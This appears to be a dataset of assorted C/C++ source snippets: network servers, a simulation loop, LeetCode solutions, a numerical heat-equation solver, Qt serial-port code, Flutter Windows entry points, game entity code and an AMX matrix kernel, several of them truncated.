    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\n#include <reactor/reactor_server.h>\n\n#define SERVER_PORT     9703\n#define PORT_COUNT      2\n\nint main(int argc,char **argv)\n{\n    struct net_reactor *reactor=(struct net_reactor *)malloc(sizeof(struct net_reactor));\n    if(reactor==NULL)\n    {\n        perror(\"malloc struct net_reactor failed!\\n\");\n        return REACTOR_MALLOC_MEMORY_FAILED;\n    }\n\n    if(init_reactor(reactor)<0)\n    {\n        free(reactor);\n        return REACTOR_NULL;\n    }\n\n    unsigned short port = SERVER_PORT;\n    int sockfds[PORT_COUNT]={0};\n    int i=0;\n    for(i=0;i<PORT_COUNT;i++)\n    {\n        sockfds[i]=init_socket(port+i);\n        if(sockfds[i]>0)\n        {\n            if(reactor_add_listener(reactor,sockfds[i],callback_accept)<0)\n                printf(\"reactor_add_listener failed in %s : %d\\n\",__func__,__LINE__);\n        }\n        else\n        {\n            printf(\"init_socket failed in %s : %d\\n\",__func__,__LINE__);\n        }\n        \n    }\n\n    reactor_run(reactor);\n\n    // \u9500\u6bc1 reactor\n\t//reactor_destory(reactor);\n    reactor->finish_reactor=1;\n\n    // \u5173\u95edsocket\u96c6\n    for(i=0;i<PORT_COUNT;i++)\n    {\n        close(sockfds[i]);\n    }\n\n    // \u91ca\u653ereactor\n\tfree(reactor);\n\n    return 0;\n\n}\n",
    "#include \"Payoffs.h\"\n#include \"LearningDecision.h\"\n#include \"competenceUpdate.h\"\n#include \"Assortment.h\"\n\n/**\n * Runs the simulation for a specified number of time steps.\n *\n * This function iterates over the time steps from 0 to params.t. At each time step, it performs the following steps:\n * 1. Gets choices from chooseActions.\n * 2. Updates payoffs using updatePayoffs.\n * 3. Gets learning choices from learnSocially.\n * 4. Updates competences using updateCompetences.\n *\n * @param data Reference to the PayoffData object containing payoff information.\n * @param agents Reference to the AgentData object containing agent information.\n * @param graph Reference to the Graph object containing the graph structure.\n * @param params Reference to the Params object containing simulation parameters.\n */\nvoid runSimulation(PayoffData& data, Agents& agents, Graph& graph, const Params& params) {\n    \n\n    for (int time_step = 0; time_step < params.t; ++time_step) {\n        arma::umat groups = Assortment::createAssortment(agents, params);\n        arma::ivec choices = chooseActions(time_step, data, params);\n        updatePayoffs(time_step, choices, agents, data);\n        arma::ivec learning_choices = learnSocially(time_step, data, groups, params);\n        updateCompetences(agents, learning_choices, graph);\n    }\n}\n",
    "#include <vector>\n//solution using Bruteforce\nclass Solution {\npublic:\n    vector<int> twoSum(vector<int>& nums, int target) {\n        for (int i = 0; i < nums.size(); i++) {\n            for (int j = i + 1; j < nums.size(); j++) {\n                if (nums[i] + nums[j] == target) {\n                    return {i, j};\n                }\n            }\n        }\n        return {};\n    }\n};\n\n\n//solution using the 2pointer method\n\nclass Solution {\npublic:\n    vector<int> twoSum(vector<int>& nums, int target) {\n        int low=0, high=nums.size()-1;\n        int n= nums.size();\n        vector<int> nums2(nums);\n        sort(nums2.begin(),nums2.end());\n        for (int i=0; i<n;i++){\n            if((nums2[high]+ nums2[low])==target) break;\n            else if((nums2[high]+ nums2[low])>target) high--;\n            else{ low++;}\n        }\n        vector<int> v;\n        for(int i=0;i<n;i++){\n            if(nums[i]==nums2[low]) v.push_back(i);\n            else if(nums[i]==nums2[high]) v.push_back(i);\n        }\n        return v;\n    }\n};",
    "//\n//  tour_generator.cpp\n//  GoogleMapsDemo\n//\n//  Created by Arav Pant on 3/9/24.\n//\n\n#include \"tour_generator.h\"\n#include \"geotools.h\"\n#include <vector>\n\nTourGenerator::TourGenerator(const GeoDatabaseBase& geodb, const RouterBase& router):GEO_db(geodb), Router_db(router) {}\n\n\nTourGenerator::~TourGenerator() {}\n\n\nstring TourGenerator::getDirection(GeoPoint a, GeoPoint b) const {\n    double angle = angle_of_line(a,b);\n    string temp;\n    \n    if( angle >= 0 && angle < 22.5) return \"east\";\n    else if(angle < 67.5) return \"northeast\";\n    else if(angle < 112.5) return \"north\";\n    else if(angle < 157.5) return \"northwest\";\n    else if(angle < 202.5) return \"west\";\n    else if(angle < 247.5) return \"southwest\";\n    else if(angle < 292.5) return \"south\";\n    else if(angle < 337.5) return \"southeast\";\n    \n    return \"east\";\n    \n}\n\n\n\n\n\n\n\nstd::vector<TourCommand> TourGenerator::generate_tour(const Stops& stops) const {\n    vector<TourCommand> result;\n    \n    for(int i = 0; i < stops.size(); i++) { // changed stops.size () - 1 to stops.size()\n        TourCommand current;\n        string accesspoi;\n       // string accessnextpoi;\n        string accesscommentary;\n        //string accessnextcommentary;\n        stops.get_poi_data(i, accesspoi, accesscommentary);\n        //stops.get_poi_data(i + 1, accessnextpoi, accessnextcommentary);\n        current.init_commentary(accesspoi, accesscommentary);\n        result.push_back(current);\n        if(i != stops.size() - 1){\n            string accessnextpoi;\n            string accessnextcommentary;\n            stops.get_poi_data(i + 1, accessnextpoi, accessnextcommentary);\n            GeoPoint now;\n            GeoPoint tomorrow;\n            GEO_db.get_poi_location(accesspoi, now);\n            GEO_db.get_poi_location(accessnextpoi, tomorrow);\n            vector<GeoPoint> path = Router_db.route(now, tomorrow);\n       \n            \n            \n            for(int j = 0; j < path.size() - 1 && path.size() != 0; j++) {\n                string streetName = GEO_db.get_street_name(path[j], path[j + 1]);\n                string direction = getDirection(path[j], path[j + 1]);\n                double distance = distance_earth_miles(path[j], path[j + 1]);\n                TourCommand Proceed;\n                Proceed.init_proceed(direction, streetName, distance, now, tomorrow);\n                result.push_back(Proceed);\n                if(j + 2 < path.size()) { // changed <= to <\n                    GeoPoint third = path[j + 2];\n                    string secondStreetName = GEO_db.get_street_name(path[j + 1], third);\n                    if(secondStreetName != streetName) {\n                        double angleTurn = angle_of_turn(path[j], path[j+1], third);\n                        if(angleTurn >= 1 && angleTurn <= 359) {\n                            string Turndirection;\n                            if(angleTurn >= 1 && angleTurn < 180) Turndirection = \"left\";\n                            else Turndirection = \"right\";\n                            TourCommand turn;\n                            //string Turndirection = getDirection(path[j + 1], third);\n                            turn.init_turn(Turndirection, secondStreetName);\n                            result.push_back(turn);\n                        }\n                    }\n                    \n                }\n\n            }\n        }\n        \n        \n        \n        \n    }\n    \n    \n    \n    \n    return result;\n    \n}\n",
    "#include <iostream>\nusing namespace std;\n\nconst int N = 6;        // Number of spatial points (L/dx + 1)\nconst int M = 1;       // Number of time steps (T/dt)\nconst double r = 0.020875;   // Given ratio r = 0.5\nconst double dx = 2.0;\nconst double dt = 0.01;\n\n// Function to set up the initial condition u(x, 0)\nvoid initialCondition(double u[N]) {\n    for (int j = 1; j < N-1; ++j) {\n        double x = j * dx; // dx = 1\n        //u[j] = 0.5 * x * (8 - x);\n        u[j] = 0;\n    }\n}\n\n// Function to solve the tridiagonal system using the Thomas algorithm\nvoid thomasAlgorithm(double a[N-1], double b[N], double c[N-1], double d[N], double u_new[N]) {\n    double c_prime[N];\n    double d_prime[N];\n\n    // Forward sweep\n    c_prime[0] = c[0] / b[0];\n    d_prime[0] = d[0] / b[0];\n\n    for (int i = 1; i < N; ++i) {\n        double denom = b[i] - a[i-1] * c_prime[i-1];\n        if (i < N-1) c_prime[i] = c[i] / denom;\n        d_prime[i] = (d[i] - a[i-1] * d_prime[i-1]) / denom;\n    }\n\n    // Back substitution\n    u_new[N-1] = d_prime[N-1];\n    for (int i = N-2; i >= 0; --i) {\n        u_new[i] = d_prime[i] - c_prime[i] * u_new[i+1];\n    }\n}\n\nint main() {\n    // Arrays to store the current and next time step solutions\n    double u[N] = {0.0};       // Solution array at current time step\n    double u_new[N] = {0.0};   // Solution array at next time step\n\n    // Initialize the solution with the initial condition\n    initialCondition(u);\n\n\n    // Coefficients for the tridiagonal matrix\n    double a[N-1]; // sub-diagonal\n    double b[N];   // main diagonal\n    double c[N-1]; // super-diagonal\n    for (int i = 0; i < N-1; ++i) {\n        a[i] = -r;\n        c[i] = -r;\n    }\n    for (int i = 0; i < N; ++i) {\n        b[i] = 1 + 2 * r;\n    }\n\n    // Time-stepping loop\n    for (int n = 0; n <= M; ++n) {\n        // Apply boundary conditions\n        u[0] = 100.0;      // Boundary condition at x = 0\n        u[N-1] = 50.0;    // Boundary condition at x = 8\n\n        // Print the current time step as a matrix\n        cout << \"Time step \" << n << \":\\n\";\n        for (int j = 0; j < N; ++j) {\n            cout << u[j] << \" \";\n        }\n        cout << \"\\n\\n\";\n\n        if (n < M) {\n            // Set up the right-hand side vector d\n            double d[N];\n            d[0] = 0.0;   // Boundary condition at x = 0\n            d[N-1] = 0.0; // Boundary condition at x = L\n\n            for (int j = 1; j < N-1; ++j) {\n                d[j] = r * u[j-1] + (1 - 2 * r) * u[j] + r * u[j+1];\n            }\n\n            // Solve the tridiagonal system\n            thomasAlgorithm(a, b, c, d, u_new);\n\n            // Update the solution for the next time step\n            for (int j = 0; j < N; ++j) {\n                u[j] = u_new[j];\n            }\n        }\n    }\n\n    return 0;\n}",
    "\n#include \"QUICGemPOCModuleInterface.h\"\n#include <AzCore/Memory/Memory.h>\n\n#include <QUICGemPOC/QUICGemPOCTypeIds.h>\n\n#include <Clients/QUICGemPOCSystemComponent.h>\n\nnamespace QUICGemPOC\n{\n    AZ_TYPE_INFO_WITH_NAME_IMPL(QUICGemPOCModuleInterface,\n        \"QUICGemPOCModuleInterface\", QUICGemPOCModuleInterfaceTypeId);\n    AZ_RTTI_NO_TYPE_INFO_IMPL(QUICGemPOCModuleInterface, AZ::Module);\n    AZ_CLASS_ALLOCATOR_IMPL(QUICGemPOCModuleInterface, AZ::SystemAllocator);\n\n    QUICGemPOCModuleInterface::QUICGemPOCModuleInterface()\n    {\n        // Push results of [MyComponent]::CreateDescriptor() into m_descriptors here.\n        // Add ALL components descriptors associated with this gem to m_descriptors.\n        // This will associate the AzTypeInfo information for the components with the the SerializeContext, BehaviorContext and EditContext.\n        // This happens through the [MyComponent]::Reflect() function.\n        m_descriptors.insert(m_descriptors.end(), {\n            QUICGemPOCSystemComponent::CreateDescriptor(),\n            });\n    }\n\n    AZ::ComponentTypeList QUICGemPOCModuleInterface::GetRequiredSystemComponents() const\n    {\n        return AZ::ComponentTypeList{\n            azrtti_typeid<QUICGemPOCSystemComponent>(),\n        };\n    }\n} // namespace QUICGemPOC\n",
    "#include \"serialport.h\"\n\nserialport::serialport() {\n\n}\n\nserialport::~serialport() {\n\n}\n\nQStringList serialport::check_serialports()\n{\n    const auto serialPortsInfo = QSerialPortInfo::availablePorts();\n    serial_ports.clear();\n\n    is_serialport_available = false;\n\n    for (const QSerialPortInfo &serialPortInfo : serialPortsInfo){\n        serial_ports.append(serialPortInfo.portName() + \" - \" + serialPortInfo.description());\n    }\n\n    sort(serial_ports.begin(), serial_ports.end(), less<QString>());\n    //qDebug() << \"Serial ports: \" << serial_ports;\n\n    return serial_ports;\n}\n\nQString serialport::open_serialport(QString serial_port, QString baudrate, QString parity)\n{\n#ifdef Q_OS_LINUX\n    serial_port.insert(0, serialport_prefix_linux);\n#endif\n#if defined(_WIN32) || defined(WIN32) || defined (_WIN64) || defined (WIN64)\n    serial_port = serialport_prefix_win + serial_port;\n#endif\n\n    qDebug() << \"Opening serial port '\" + serial_port + \"' with baudrate '\" + baudrate + \"', please wait...\";\n    if (!(serial->isOpen() && serial->isWritable())){\n        serial->setPortName(serial_port);\n        serial->setBaudRate(baudrate.toDouble());\n        serial->setDataBits(QSerialPort::Data8);\n        serial->setStopBits(QSerialPort::OneStop);\n        if (parity == \"No parity\")\n            serial->setParity(QSerialPort::NoParity);\n        if (parity == \"Even parity\")\n            serial->setParity(QSerialPort::EvenParity);\n        serial->setFlowControl(QSerialPort::NoFlowControl);\n\n        if (serial->open(QIODevice::ReadWrite)){\n            serial->clearError();\n            serial->clear();\n            serial->flush();\n            opened_serialport = serial_port;\n            //connect(serial, SIGNAL(readyRead()), this, SLOT(read_data()), Qt::DirectConnection);\n            qRegisterMetaType<QSerialPort::SerialPortError>();\n            connect(serial, SIGNAL(error(QSerialPort::SerialPortError)), this, SLOT(handle_error(QSerialPort::SerialPortError)));\n\n            //send_log_window_message(\"Serial port '\" + serialPort + \"' is open at baudrate \" + serialPortBaudRate, true, true);\n            qDebug() << \"Serial port '\" + serial_port + \"' is open at baudrate \" + serialport_baudrate;\n            return opened_serialport;\n        }\n        else\n        {\n            //SendLogWindowMessage(\"Couldn't open serial port '\" + serialPort + \"'\", true, true);\n            qDebug() << \"Couldn't open serial port '\" + serial_port + \"'\";\n            opened_serialport.clear();\n            return opened_serialport;\n        }\n\n    }\n    else{\n        //SendLogWindowMessage(\"Serial port '\" + serialPort + \"' is already opened\", true, true);\n        qDebug() << \"Serial port '\" + serial_port + \"' is already opened\";\n        return opened_serialport;\n    }\n\n    //return openedSerialPort;\n    return opened_serialport;\n}\n\nQString serialport::close_serialport()\n{\n    if (serial->isOpen())\n    {\n        qDebug() << \"Closing serial port '\" + opened_serialport + \"'\";\n        serial->close();\n        qDebug() << \"Serial port '\" + opened_serialport + \"' closed!\";\n        opened_serialport.clear();\n    }\n    return opened_serialport;\n}\n\nvoid serialport::reset_connection()\n{\n    close_serialport();\n}\n\nbool serialport::is_serialport_open()\n{\n    return serial->isOpen();\n}\n\nbool serialport::write_data(QByteArray output, bool echo_check)\n{\n    QByteArray msg;\n    QByteArray received;\n\n    received.clear();\n    if (is_serialport_open())\n    {\n        for (int i = 0; i < output.length(); i++)\n        {\n            msg[0] = output.at(i);\n            serial->write(msg, 1);\n            // Add serial echo read during transmit to speed up a little\n            if (serial->bytesAvailable() && echo_check)\n                received.append(serial->read(1));\n        }\n        QTime dieTime = QTime::currentTime().addMSecs(200);\n        while (received.length() < output.length() && (QTime::currentTime() < dieTime) && echo_check)\n        {\n            if (serial->bytesAvailable())\n            {\n                dieTime = QTime::currentTime().addMSecs(200);\n                received.append(serial->read(1));\n            }\n            QCoreApplication::processEvents(QEventLoop::AllEvents, 1);\n        }\n\n        return STATUS_SUCCESS;\n    }\n\n    return STATUS_ERROR;\n}\n\nQByteArray serialport::read_data()\n{\n    QByteArray received;\n\n    while (serial->bytesAvailable())\n    {\n        //qDebug() << \"Byte received...\";\n        received.append(serial->readAll());\n        delay(1);\n    }\n    return received;\n}\n\nvoid serialport::delay(int timeout)\n{\n    QTime dieTime = QTime::currentTime().addMSecs(timeout);\n    while (QTime::currentTime() < dieTime)\n        QCoreApplication::processEvents(QEventLoop::AllEvents, 10);\n}\n\nvoid serialport::handle_error(QSerialPort::SerialPortError error)\n{\n    //qDebug() << \"Error:\" << error;\n\n    if (error == QSerialPort::NoError)\n    {\n    }\n    else if (error == QSerialPort::DeviceNotFoundError)\n    {\n        reset_connection();\n    }\n    else if (error =",
    "#include \"Server.hpp\"\n\n// GETTERS //\n\nClient\t*Server::get_client_by_fd( const int& fd ) {\n\n\tfor (size_t i = 0; i < this->_client_register.size(); i++) {\n\n\t\tif (this->_client_register[i].get_client_fd() == fd)\n\t\t\treturn &this->_client_register[i];\n\t}\n\treturn NULL;\n}\n\nClient\t*Server::get_client( const std::string& nickname ) {\n\n\tfor (size_t i = 0; i < this->_client_register.size(); i++) {\n\n\t\tif (this->_client_register[i].get_client_nickname() == nickname)\n\t\t\treturn &this->_client_register[i];\n\t}\n\treturn NULL;\n}\n\nChannel\t*Server::get_channel( const std::string& name ) {\n\n\tfor (size_t i = 0; i < this->_channel_register.size(); i++) {\n\n\t\tif (this->_channel_register[i].get_channel_name() == name)\n\t\t\treturn &this->_channel_register[i];\n\t}\n\treturn NULL;\n}\n\n// FUNCTIONS //\n\nbool\tServer::_signal = false;\n\nvoid\tServer::signal_handler( int signum ) {\n\n\t(void)signum;\n\tstd::cout << std::endl << yellow << \"Signal received !\" << white << std::endl;\n\t_signal = true;\n}\n\nvoid\tServer::server_init( const int& port, const std::string& password ) {\n\n\tset_port(port);\n\tset_password(password);\n\tset_oper_password();\n\tsocket_creation();\n\tstd::cout << green << \"Server launched and waiting for requests...\" << white << std::endl;\n\n\twhile (get_signal() == false) {\n\n\t\tif((poll(&_pollfd_register[0], _pollfd_register.size(), -1) < 0) && get_signal() == false)\n\t\t\tthrow(std::runtime_error(\"poll() faild\"));\n\n\t\tfor (size_t i = 0; i < _pollfd_register.size(); i++) {\n\n\t\t\tif (_pollfd_register[i].revents & POLLIN) {\n\n\t\t\t\tif (_pollfd_register[i].fd == get_socket_fd())\n\t\t\t\t\tnew_client_request();\n\t\t\t\telse\n\t\t\t\t\tdata_receiver(_pollfd_register[i].fd);\n\t\t\t}\n\t\t}\n\t}\n\tclose_socket_fd();\n}\n\nvoid\tServer::socket_creation() {\n\n\tstruct sockaddr_in addr;\n\taddr.sin_family = AF_INET;\n\taddr.sin_addr.s_addr = INADDR_ANY;\n\taddr.sin_port = htons(get_port());\n\n\tset_socket_fd(socket(AF_INET, SOCK_STREAM, 0));\n\tif (get_socket_fd() < 0) {\n\t\tthrow(std::runtime_error(\"failed to create socket\"));\n\t}\n\n\tint opt = 1;\n\tif (setsockopt(get_socket_fd(), SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0)\n\t\tthrow(std::runtime_error(\"failed to socket opt\"));\n\tif (fcntl(get_socket_fd(), F_SETFL, O_NONBLOCK) < 0)\n\t\tthrow(std::runtime_error(\"failed to fcntl\"));\n\tif (bind(get_socket_fd(), (struct sockaddr *)&addr, sizeof(addr)) < 0)\n\t\tthrow(std::runtime_error(\"failed to bind\"));\n\tif (listen(get_socket_fd(), SOMAXCONN) < 0)\n\t\tthrow(std::runtime_error(\"failed to listen\"));\n\n\tstruct pollfd pollfd;\n\tpollfd.fd = get_socket_fd();\n\tpollfd.events = POLLIN;\n\tpollfd.revents = 0;\n\t_pollfd_register.push_back(pollfd);\n}\n\nvoid\tServer::new_client_request() {\n\n\tClient client;\n\tstruct sockaddr_in addr;\n\tstruct pollfd pollfd;\n\tsocklen_t addr_len = sizeof(addr);\n\n\tint connect_fd = accept(get_socket_fd(), (sockaddr *)&(addr), &addr_len);\n\tif (connect_fd == -1)\n\t\t{std::cout << \"accept() failed\" << std::endl; return;}\n\n\tif (fcntl(connect_fd, F_SETFL, O_NONBLOCK) == -1)\n\t\t{std::cout << \"fcntl() failed\" << std::endl; return;}\n\n\tpollfd.fd = connect_fd;\n\tpollfd.events = POLLIN;\n\tpollfd.revents = 0;\n\n\tclient.set_client_fd(connect_fd);\n\tclient.set_client_ip_addr(inet_ntoa((addr.sin_addr)));\n\tclient.set_connected_status(false);\n\tclient.set_user_status(false);\n\tclient.set_nick_status(false);\n\tclient.set_oper_status(false);\n\t_client_register.push_back(client);\n\t_pollfd_register.push_back(pollfd);\n\n\tstd::cout << yellow << \"Client [\" << client.get_client_fd() << \"] is trying to connect. Waiting for password...\" << white << std::endl;\n\tClient::send_message(connect_fd, \"You have to enter the password to begin your adventure... PASS <password>;\\n\");\n}\n\nvoid\tServer::data_receiver( const int& fd ) {\n\n\tClient *client = get_client_by_fd(fd);\n\n\tchar buff[1024];\n\tmemset(buff, 0, sizeof(buff));\n\n\tssize_t bytes = recv(fd, buff, sizeof(buff) - 1, 0);\n\n\tif (bytes <= 0) {\n\n\t\tif (bytes)\n\t\t\tstd::cout << red << \"Client [\" << client->get_client_fd() << \"] disconnected.\" << white << std::endl;\n\t\telse\n\t\t\tstd::cerr << \"recv() error on client [\" << client->get_client_fd() << \"].\" << std::endl;\n\t\tclient_clear(client->get_client_fd());\n\t\tclose(client->get_client_fd());\n\t\treturn;\n\t}\n \n\tstd::string command_buffer = client->get_command_buffer() + std::string(buff, bytes);\n\tclient->set_command_buffer(command_buffer);\n\n\tsize_t pos;\n\twhile ((pos = command_buffer.find('\\n')) != std::string::npos) {\n\n\t\tstd::string command_raw = command_buffer.substr(0, pos);\n\t\tif (command_raw.empty()) {\n\n\t\t\tcommand_buffer.clear();\n\t\t\tclient->set_command_buffer(command_buffer);\n\t\t\tbreak;\n\t\t}\n\n\t\tcommand_buffer.erase(0, pos + 1);\n\t\tclient->set_command_buffer(command_buffer);\n\n\t\tif (!command_raw.empty() && command_raw[command_raw.size() - 1] == '\\r')\n\t\t\tcommand_raw.erase(command_raw.size() - 1);\n\n\t\tstd::vector<std::string> command_parsed;\n\t\tsize_t prev_pos = 0;\n\t\tsize_t curr_pos;\n\n\t\twhile ((curr_pos = command_raw.find(' ', prev_pos)) != std::string::npos) {\n\n\t\t\tif (curr_pos > prev_pos)\n\t\t\t\tcommand_parsed.push_back(command_raw.substr(prev_pos, curr_pos - prev_pos));\n\t\t\tprev_pos",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_ecommerceapp_wcart\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/* (c) Shereef Marzouk. See \"licence DDRace.txt\" and the readme.txt in the root of the distribution for more information. */\n#include <engine/server.h>\n#include <engine/config.h>\n#include <game/generated/protocol.h>\n#include <game/server/gamecontext.h>\n#include <game/server/teams.h>\n#include <game/server/gamemodes/DDRace.h>\n#include \"plasma.h\"\n\nconst float ACCEL = 1.1f;\n\nCPlasma::CPlasma(CGameWorld *pGameWorld, vec2 Pos, vec2 Dir, bool Freeze,\n\t\tbool Explosive, int ResponsibleTeam) :\n\t\tCEntity(pGameWorld, CGameWorld::ENTTYPE_LASER)\n{\n\tm_Pos = Pos;\n\tm_Core = Dir;\n\tm_Freeze = Freeze;\n\tm_Explosive = Explosive;\n\tm_EvalTick = Server()->Tick();\n\tm_LifeTime = Server()->TickSpeed() * 1.5;\n\tm_ResponsibleTeam = ResponsibleTeam;\n\tGameWorld()->InsertEntity(this);\n}\n\nbool CPlasma::HitCharacter()\n{\n\tvec2 To2;\n\tCCharacter *Hit = GameServer()->m_World.IntersectCharacter(m_Pos,\n\t\t\tm_Pos + m_Core, 0.0f, To2);\n\tif (!Hit)\n\t\treturn false;\n\n\tif (Hit->Team() != m_ResponsibleTeam)\n\t\treturn false;\n\tm_Freeze ? Hit->Freeze() : Hit->UnFreeze();\n\tif (m_Explosive)\n\t\tGameServer()->CreateExplosion(m_Pos, -1, WEAPON_GRENADE, true,\n\t\t\t\tm_ResponsibleTeam, Hit->Teams()->TeamMask(m_ResponsibleTeam));\n\tGameServer()->m_World.DestroyEntity(this);\n\treturn true;\n}\n\nvoid CPlasma::Move()\n{\n\tm_Pos += m_Core;\n\tm_Core *= ACCEL;\n}\n\nvoid CPlasma::Reset()\n{\n\tGameServer()->m_World.DestroyEntity(this);\n}\n\nvoid CPlasma::Tick()\n{\n\tif (m_LifeTime == 0)\n\t{\n\t\tReset();\n\t\treturn;\n\t}\n\tm_LifeTime--;\n\tMove();\n\tHitCharacter();\n\n\tint Res = 0;\n\tRes = GameServer()->Collision()->IntersectNoLaser(m_Pos, m_Pos + m_Core, 0,\n\t\t\t0);\n\tif (Res)\n\t{\n\t\tif (m_Explosive)\n\t\t\tGameServer()->CreateExplosion(\n\t\t\t\t\tm_Pos,\n\t\t\t\t\t-1,\n\t\t\t\t\tWEAPON_GRENADE,\n\t\t\t\t\ttrue,\n\t\t\t\t\tm_ResponsibleTeam,\n\t\t\t\t\t((CGameControllerDDRace*) GameServer()->m_pController)->m_Teams.TeamMask(\n\t\t\t\t\t\t\tm_ResponsibleTeam));\n\t\tReset();\n\t}\n\n}\n\nvoid CPlasma::Snap(int SnappingClient)\n{\n\tif (NetworkClipped(SnappingClient))\n\t\treturn;\n\tCCharacter* SnapChar = GameServer()->GetPlayerChar(SnappingClient);\n\tCPlayer* SnapPlayer = SnappingClient > -1 ? GameServer()->m_apPlayers[SnappingClient] : 0;\n\tint Tick = (Server()->Tick() % Server()->TickSpeed()) % 11;\n\n\tif (SnapChar && SnapChar->IsAlive()\n\t\t\t&& (m_Layer == LAYER_SWITCH\n\t\t\t\t\t&& !GameServer()->Collision()->m_pSwitchers[m_Number].m_Status[SnapChar->Team()])\n\t\t\t&& (!Tick))\n\t\treturn;\n\n\tif(SnapPlayer && (SnapPlayer->GetTeam() == TEAM_SPECTATORS || SnapPlayer->m_Paused) && SnapPlayer->m_SpectatorID != -1\n\t\t&& GameServer()->GetPlayerChar(SnapPlayer->m_SpectatorID)\n\t\t&& GameServer()->GetPlayerChar(SnapPlayer->m_SpectatorID)->Team() != m_ResponsibleTeam\n\t\t&& !SnapPlayer->m_ShowOthers)\n\t\treturn;\n\n\tif(SnapPlayer && SnapPlayer->GetTeam() != TEAM_SPECTATORS && !SnapPlayer->m_Paused && SnapChar\n\t\t&& SnapChar && SnapChar->Team() != m_ResponsibleTeam\n\t\t&& !SnapPlayer->m_ShowOthers)\n\t\treturn;\n\n\tif(SnapPlayer && (SnapPlayer->GetTeam() == TEAM_SPECTATORS || SnapPlayer->m_Paused) && SnapPlayer->m_SpectatorID == -1\n\t\t&& SnapChar\n\t\t&& SnapChar->Team() != m_ResponsibleTeam\n\t\t&& SnapPlayer->m_SpecTeam)\n\t\treturn;\n\n\tCNetObj_Laser *pObj = static_cast<CNetObj_Laser *>(Server()->SnapNewItem(\n\t\t\tNETOBJTYPE_LASER, m_ID, sizeof(CNetObj_Laser)));\n\n\tif(!pObj)\n\t\treturn;\n\n\tpObj->m_X = (int) m_Pos.x;\n\tpObj->m_Y = (int) m_Pos.y;\n\tpObj->m_FromX = (int) m_Pos.x;\n\tpObj->m_FromY = (int) m_Pos.y;\n\tpObj->m_StartTick = m_EvalTick;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"weather_app_with_api\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"gemv.h\"\n\n#include <chrono>\n\n#include \"amx.h\"\n#include \"utils.cpp\"\nvoid gemv() {\n  BF16 A[16 * 32];\n  BF16 x[32];\n  FP32 y[16];\n  // init data\n  init_buffer(A, (BF16)0.1, 16, 32);\n  init_buffer(x, (BF16)1, 16, 2);\n  init_buffer(y, (FP32)0, 16, 1);\n\n  gemv_tile(A, x, y);\n\n  print_buffer(y, 16, 1);\n}\n/**\n * Naive version of GEMV with AMX.\n * This version will use at most 3 tile registers to perform GEMV.\n * Please make sure that N is even.\n */\nvoid gemv_naive(const int M, const int N, const BF16* A, const BF16* x,\n                FP32* y) {\n  // check if N is even\n  if (N % 2) {\n    std::cerr << \"Error: N must be even.\" << std::endl;\n\n    return;\n  }\n  // enable amx\n  if (!enable_amx()) exit(-1);\n  // init default config\n  __tilecfg default_config = {0};\n  {\n    default_config.palette_id = 1;\n    default_config.start_row = 0;\n    // y\n    default_config.rows[0] = 16;\n    default_config.colsb[0] = 4;\n    // A\n    default_config.rows[1] = 16;\n    default_config.colsb[1] = 64;\n    // x\n    default_config.rows[2] = 16;\n    default_config.colsb[2] = 4;\n  }\n  // init row_tail config\n  int row_tail = N % 32;\n  // BF16* x_tail = nullptr;\n  // // if row_tail is odd, do 0 padding\n  // if (row_tail % 2 != 0) {\n  //   x_tail = new BF16[row_tail + 1];\n  //   const BF16* x_pointer = x + (N - row_tail);\n  //   for (int i = 0; i < row_tail; i++) {\n  //     x_tail[i] = x_pointer[i];\n  //   }\n  //   x_tail[row_tail] = 0;  // 0 padding\n  // }\n  __tilecfg row_tail_config = {0};\n  {\n    row_tail_config.palette_id = 1;\n    row_tail_config.start_row = 0;\n    // y\n    row_tail_config.rows[0] = 16;\n    row_tail_config.colsb[0] = 4;\n    // A\n    row_tail_config.rows[1] = 16;\n    row_tail_config.colsb[1] = row_tail * sizeof(BF16);\n    // x\n    row_tail_config.rows[2] = row_tail / 2;\n    row_tail_config.colsb[2] = 4;\n  }\n  // init 